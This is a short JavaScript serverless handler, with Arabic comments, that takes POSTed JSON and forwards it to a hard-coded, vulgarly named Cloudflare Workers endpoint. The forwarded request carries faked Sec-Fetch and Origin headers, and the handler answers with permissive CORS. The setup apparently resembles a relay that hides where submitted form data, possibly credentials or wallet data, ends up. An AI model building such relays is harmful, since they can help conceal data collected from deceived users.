// api/submit.js

const WORKER_URL = "https://1fuckurmotherhahahahahahaha.eth2-stiffness640.workers.dev/";

// استخرج origin من الـ Referer إذا كان Origin مفقود
function originFromReferer(referer = "") {
  try {
    if (!referer) return "";
    const u = new URL(referer);
    return `${u.protocol}//${u.host}`;
  } catch { return ""; }
}

export default async function handler(req, res) {
  // GET للتشخيص
  if (req.method === "GET") {
    return res.status(200).json({ ok: true, hint: "Use POST with JSON body" });
  }

  // دعم الـ preflight للمتصفح
  if (req.method === "OPTIONS") {
    return res
      .status(200)
      .set({
        "Access-Control-Allow-Origin": req.headers.origin || "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type",
        "Vary": "Origin"
      })
      .send("ok");
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  try {
    // مرّر Origin للـWorker (الـWorker عندك يتحقق منه)
    const origin = req.headers.origin || originFromReferer(req.headers.referer || "");

    const response = await fetch(WORKER_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json,text/html;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Origin": origin || "" // حتى لو فاضي، نمرّره
      },
      body: JSON.stringify(req.body)
    });

    // ارجع النص دائمًا، وإن أمكن حوّله JSON
    const raw = await response.text();
    let payload;
    try { payload = JSON.parse(raw); } catch { payload = { raw }; }

    return res
      .status(response.status)
      .set({
        "Access-Control-Allow-Origin": req.headers.origin || "*",
        "Vary": "Origin"
      })
      .json(payload);

  } catch (err) {
    return res.status(500).json({
      error: "Failed forwarding request",
      details: err?.message || "unknown"
    });
  }
}
